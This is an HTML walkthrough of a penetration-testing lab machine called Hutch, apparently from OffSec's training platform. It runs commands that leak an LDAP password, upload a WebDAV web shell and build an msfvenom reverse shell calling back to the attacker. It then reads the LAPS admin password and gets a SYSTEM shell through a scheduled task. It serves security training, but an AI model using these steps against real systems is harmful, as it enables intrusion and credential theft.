@@ -1,0 +1,269 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function onFinishModal() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for Hutch</h1>
+<h2>Summary</h2>
+<p>In this walkthrough, we will exploit the target by leaking a user's password from LDAP and using the IIS web server with enabled WebDAV to upload a shell and gain code execution. We'll then escalate by leveraging Microsoft LAPS and subsequently discover the Administrator user's random password via LDAP.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll begin with a service version <code>nmap</code> scan.</p>
+<pre id="fence-code-1" class="fence-code"><code>kali@kali:~$ sudo nmap -sV 192.168.120.108
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-05 06:05 EST
+Nmap scan report for 192.168.120.108
+Host is up (0.30s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-11-05 11:05:51Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+</code></pre>
+<p>We discover an IIS web server running on port 80. Let's run a more detailed scan.</p>
+<pre id="fence-code-2" class="fence-code"><code>kali@kali:~$ sudo nmap -p 80 -sC 192.168.120.108
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 09:03 EST
+Nmap scan report for 192.168.120.108
+Host is up (0.029s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
+|_http-title: IIS Windows Server
+| http-webdav-scan: 
+|   WebDAV type: Unknown
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
+|   Server Date: Thu, 11 Feb 2021 14:03:31 GMT
+|_  Server Type: Microsoft-IIS/10.0
+</code></pre>
+<p>It appears that the server has <em>WebDAV</em> enabled. WebDAV is an extension of the Hypertext Transfer Protocol that allows clients to perform remote web content authoring operations.</p>
+<p>Our initial scan also identifies the LDAP service running on the target. In order to enumerate it more effectively, we need to identify the target's domain. Let's run a more specific scan against the LDAP service on TCP port 389:</p>
+<pre id="fence-code-3" class="fence-code"><code>kali@kali:~$ sudo nmap -p 389 -sC -sV 192.168.120.108
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 11:35 EST
+Nmap scan report for 192.168.120.108
+Host is up (0.031s latency).
+
+PORT    STATE SERVICE VERSION
+389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>This indicates that the domain is <code>hutch.offsec</code>.</p>
+<h3>LDAP Enumeration</h3>
+<p>Now that we have discovered the target's domain, let's try to enumerate the LDAP service with <code>ldapsearch</code>.</p>
+<pre id="fence-code-4" class="fence-code"><code>kali@kali:~$ ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.120.108" "(objectclass=*)"
+ldap_initialize( ldap://192.168.120.108:389/??base )
+filter: (objectclass=*)
+requesting: All userApplication attributes
+
+...
+
+# Freddy McSorley, Users, hutch.offsec
+dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Freddy McSorley
+description: Password set to CrabSharkJellyfish192 at user's request. Please change on next login.
+distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104061946.0Z
+uSNCreated: 12831
+uSNChanged: 16421
+name: Freddy McSorley
+objectGUID:: TxilGIhMVkuei6KplCd8ug==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132489437036308102
+lastLogoff: 0
+lastLogon: 132489470295517853
+pwdLastSet: 132489417058152751
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: fmcsorley
+sAMAccountType: 805306368
+userPrincipalName: fmcsorley@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+lastLogonTimestamp: 132489443869160701
+...
+</code></pre>
+<p>The output is rather lengthy, but as we carefully parse it, we discover that the description of the Freddy McSorley (<code>fmcsorley</code>) user may contain a cleartext password.</p>
+<pre id="fence-code-5" class="fence-code"><code>Password set to CrabSharkJellyfish192 at user's request. Please change on next login.
+</code></pre>
+<p>If we combine this discovery with WebDAV, we should be able to obtain a reverse shell.</p>
+<h2>Exploitation</h2>
+<h3>WebDAV Web Shell</h3>
+<p>Let's begin our exploitation with the ASPX web shell from <strong>/usr/share/webshells/aspx/cmdasp.aspx</strong> and upload it via WebDAV with the <code>cadaver</code> tool and the recovered credentials.</p>
+<pre id="fence-code-6" class="fence-code"><code>kali@kali:~$ cadaver http://192.168.120.108
+Authentication required for 192.168.120.108 on server `192.168.120.108':
+Username: fmcsorley
+Password: CrabSharkJellyfish192
+dav:/&gt; put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
+Uploading /usr/share/webshells/aspx/cmdasp.aspx to `/cmdasp.aspx':
+Progress: [=============================&gt;] 100.0% of 1400 bytes succeeded.
+dav:/&gt; 
+</code></pre>
+<p>We'll leave the WebDAV connection open for now. If we navigate to http://192.168.120.108/cmdasp.aspx, we should be able to execute commands on the target.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_57_image_1_vGnhk4an.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<h3>Upgrade to Reverse Shell</h3>
+<p>To upgrade to a full reverse shell, we'll first generate an <code>msfvenom</code> payload using local port 445 for our listener.</p>
+<pre id="fence-code-7" class="fence-code"><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.5 LPORT=445 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
+</code></pre>
+<p>Next, we'll upload the payload using our WebDAV connection.</p>
+<pre id="fence-code-8" class="fence-code"><code>dav:/&gt; put shell.exe
+Uploading shell.exe to `/shell.exe':
+Progress: [=============================&gt;] 100.0% of 73802 bytes succeeded.
+dav:/&gt; exit
+Connection to `192.168.120.108' closed.
+</code></pre>
+<p>Let's start a Netcat listener on port 445.</p>
+<pre id="fence-code-9" class="fence-code"><code>kali@kali:~$ sudo nc -lvp 445                   
+listening on [any] 445 ...
+</code></pre>
+<p>Finally, we'll execute our payload from the web shell by providing the full path to the executable (<strong>C:\inetpub\wwwroot\shell.exe</strong>). Our listener indicates that we have received the reverse shell.</p>
+<pre id="fence-code-10" class="fence-code"><code>kali@kali:~$ sudo nc -lvp 445                   
+listening on [any] 445 ...
+192.168.120.108: inverse host lookup failed: Unknown host
+connect to [KALI-IP] from (UNKNOWN) [192.168.120.108] 50393
+Microsoft Windows [Version 10.0.17763.1554]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+whoami
+iis apppool\defaultapppool
+</code></pre>
+<h2>Escalation</h2>
+<h3>Microsoft LAPS</h3>
+<p>Next, we'll escalate our privileges. The contents of the <strong>C:\Program Files\</strong> directory indicate that Microsoft's <em>Local Administrator Password Solution (LAPS)</em> may be installed.</p>
+<pre id="fence-code-11" class="fence-code"><code>c:\windows\system32\inetsrv&gt;dir "C:\Program Files"
+dir "C:\Program Files"
+ Volume in drive C has no label.
+ Volume Serial Number is 0A26-9DC1
+
+ Directory of C:\Program Files
+
+11/03/2020  09:59 PM    &lt;DIR&gt;          .
+11/03/2020  09:59 PM    &lt;DIR&gt;          ..
+11/04/2020  04:08 AM    &lt;DIR&gt;          Common Files
+11/03/2020  08:34 PM    &lt;DIR&gt;          internet explorer
+11/03/2020  09:59 PM    &lt;DIR&gt;          LAPS
+11/03/2020  09:37 PM    &lt;DIR&gt;          MSBuild
+11/03/2020  09:37 PM    &lt;DIR&gt;          Reference Assemblies
+11/04/2020  04:08 AM    &lt;DIR&gt;          VMware
+11/03/2020  08:39 PM    &lt;DIR&gt;          Windows Defender
+11/03/2020  09:02 PM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
+09/14/2018  11:19 PM    &lt;DIR&gt;          Windows Mail
+11/03/2020  08:34 PM    &lt;DIR&gt;          Windows Media Player
+09/14/2018  11:19 PM    &lt;DIR&gt;          Windows Multimedia Platform
+09/14/2018  11:28 PM    &lt;DIR&gt;          windows nt
+11/03/2020  08:34 PM    &lt;DIR&gt;          Windows Photo Viewer
+09/14/2018  11:19 PM    &lt;DIR&gt;          Windows Portable Devices
+09/14/2018  11:19 PM    &lt;DIR&gt;          Windows Security
+09/14/2018  11:19 PM    &lt;DIR&gt;          WindowsPowerShell
+               0 File(s)              0 bytes
+              18 Dir(s)  12,207,812,608 bytes free
+</code></pre>
+<p>LAPS is a tool that periodically changes the local administrator's password when it expires. It then stores the password details in the Active Directory. Using the credentials we have already found (<code>fmcsorley:CrabSharkJellyfish192</code>), let's attempt to query LDAP for the local administrator password.</p>
+<pre id="fence-code-12" class="fence-code"><code>kali@kali:~$ ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+ldap_initialize( ldap://192.168.120.108 )
+filter: (ms-MCS-AdmPwd=*)
+requesting: ms-MCS-AdmPwd 
+# extended LDIF
+#
+# LDAPv3
+# base &lt;DC=hutch,DC=offsec&gt; with scope subtree
+# filter: (ms-MCS-AdmPwd=*)
+# requesting: ms-MCS-AdmPwd 
+#
+
+# HUTCHDC, Domain Controllers, hutch.offsec
+dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
+ms-Mcs-AdmPwd: T4E@d8!/od@l36
+
+# search reference
+ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 5
+# numEntries: 1
+# numReferences: 3
+</code></pre>
+<p>Luckily, we discover a password (<code>T4E@d8!/od@l36</code>) for <code>ms-Mcs-AdmPwd</code>. Note that because of LAPS, this password will be different in your environment.</p>
+<p>From here we can escalate to an administrative shell by creating a new scheduled task that will re-execute our reverse shell payload with <code>SYSTEM</code> level integrity. We'll use the target's enumerated LDAP Common Name (<code>HUTCHDC</code>) in the creation of the scheduled task.</p>
+<p>First, let's restart out Netcat listener.</p>
+<pre id="fence-code-13" class="fence-code"><code>kali@kali:~$ sudo nc -lvp 445
+listening on [any] 445 ...
+</code></pre>
+<p>Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.</p>
+<pre id="fence-code-14" class="fence-code"><code>c:\windows\system32\inetsrv&gt;powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
+$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
+PS C:\windows\system32\inetsrv&gt;
+
+PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
+$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
+PS C:\windows\system32\inetsrv&gt;
+
+PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
+SUCCESS: The scheduled task "shell" has successfully been created.
+PS C:\windows\system32\inetsrv&gt;
+
+PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
+Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
+SUCCESS: Attempted to run the scheduled task "shell".
+PS C:\windows\system32\inetsrv&gt;
+</code></pre>
+<p>Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.</p>
+<pre id="fence-code-15" class="fence-code"><code>kali@kali:~$ nc -lvp 445
+listening on [any] 445 ...
+192.168.120.108: inverse host lookup failed: Unknown host
+connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731
+Microsoft Windows [Version 10.0.17763.1554]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
